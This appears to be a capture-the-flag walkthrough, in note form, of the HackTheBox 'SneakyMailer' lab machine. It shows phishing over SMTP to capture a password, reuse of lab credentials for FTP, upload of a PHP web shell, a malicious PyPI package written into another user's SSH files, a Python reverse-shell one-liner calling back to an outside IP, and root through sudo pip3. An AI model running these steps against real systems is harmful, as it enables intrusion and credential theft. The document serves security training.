@@ -1,0 +1,180 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 10:46 EDT
+Nmap scan report for sneakymailer.htb (10.10.10.197)
+Host is up (0.070s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+*****21/tcp   open  ftp      vsftpd 3.0.3**************************************
+*****22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)****
+| ssh-hostkey: 
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+*****25/tcp   open  smtp     Postfix smtpd*************************************
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+*****80/tcp   open  http     nginx 1.14.2**************************************
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+*****143/tcp  open  imap     Courier Imapd (released 2018)*********************
+|_imap-capabilities: STARTTLS completed SORT UIDPLUS CHILDREN OK THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 ACL2=UNION THREAD=REFERENCES IDLE CAPABILITY QUOTA ENABLE NAMESPACE IMAP4rev1 ACL
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+*****993/tcp  open  ssl/imap Courier Imapd (released 2018)*********************
+|_imap-capabilities: completed SORT UIDPLUS CHILDREN OK THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 AUTH=PLAIN ACL2=UNION THREAD=REFERENCES IDLE CAPABILITY QUOTA ENABLE NAMESPACE IMAP4rev1 ACL
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+*****8080/tcp open  http     nginx 1.14.2**************************************
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 80.50 seconds
+
+/js
+/css
+/img
+sneakymailer.htb/vendor
+sneakymailer.htb/vendor/jquery
+
+cewl -w out.cewl -e target
+
+imap
+smtp
+fp
+
+bradleygreer@sneakymailer.htb
+carastevens@sneakymailer.htb
+
+send out emails using their smtp with your vpn ip
+
+kali@kali:~$ sudo nc -lvnp 80
+listening on [any] 80 ...
+
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.197] 39680
+POST / HTTP/1.1
+Host: 10.10.14.18
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul
+lastName=Byrd
+email=paulbyrd%40sneakymailer.htb
+password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+
+log in at the imap server:
+paulbyrd
+^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+sudo apt-get install claws-mail
+get mail from server
+see sent mail:
+--------------------------------------------------------------------------------
+From: Paul Byrd <paulbyrd@sneakymailer.htb>
+To: low@debian
+Subject: Module testing
+Date: Wed, 27 May 2020 13:28:58 -0400
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+ Thunderbird/68.8.0
+
+Hello low
+
+
+Your current task is to install, test and then erase every python module you 
+find in our PyPI service, let me know if you have any inconvenience.
+
+--------------------------------------------------------------------------------
+From: Paul Byrd <paulbyrd@sneakymailer.htb>
+To: root <root@debian>
+Subject: Password reset
+Date: Fri, 15 May 2020 13:03:37 -0500
+
+Hello administrator, I want to change this password for the developer account
+
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do it 
+
+--------------------------------------------------------------------------------
+use these creds in ftp? yes
+but dont use ftp client in terminal, navgivate in browswer:
+ftp://developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C@sneakymailer.htb
+
+there is a dev.sneakycorp.htb fuzzing this...
+gives nothing
+put a php file on the ftp
+
+connect to ftp in passive mode (ftp -p)-> quote PASV to be in passive mode
+nope ^
+
+just use filezilla connect to port 21
+dump a php shell with filezilla
+visit the dev.sneakycorp.htb/shell.php
+
+/var/www/pypi.sneakycorp.htb/.htpasswd has a hash...
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+cHlwaTokYXByMSRSVjVjNVlWcyRVOS5PVHFGNW44SzRteFdwU1NSL3AvCg==
+soufianeelhaoui
+
+http://dev.sneakycorp.htb:8080/
+^ fuzz this. got nothing.
+
+filezilla:
+  Username: developer
+  Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+  put php backdoor
+  visit the dev.sneakycorp.htb/shell.php
+
+How the heck do i get my malicious package onto the server?
+  on victim host:
+    change home directory
+      HOME=/tmp/.kun
+
+    put a .pypirc in home
+      this must define a local repo
+        [distutils]
+        index-servers=
+          local
+
+        [local]
+        repository: http://pypi.sneakycorp.htb:8080/
+        username: pypi
+        password: soufianeelhaoui
+
+    create a setup.py file to execute as low user... so you can write into low's fs
+
+    wget setup.py and .pypirc into the temp folder and build the package
+      python3 setup.py sdist register -r local upload -r local
+
+    this will execute setup.py and write into lows fs bc setup has a write file op
+      will only work with python3 try/except.
+      try/except will allow you to bypass the failure when developer user tries
+        to write to low's file. Low's script will run setup though and cause
+        the file to write to its ssh stuff.
+
+ROOT: https://root4loot.com/post/pip-install-privilege-escalation/
+  Follow the link, but do something simpler by just calling:
+    p = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.33\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    os.system(p)
+
+  Matching Defaults entries for low on sneakymailer:                                                        
+      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+                                                                                                            
+  User low may run the following commands on sneakymailer:                                                  
+      (root) NOPASSWD: /usr/bin/pip3                                                                        
+
+  sudo -H /usr/bin/pip3 install . --upgrade --force-reinstall
+    create a setup.py file and exploit root
+    the sudo command will run the setup file
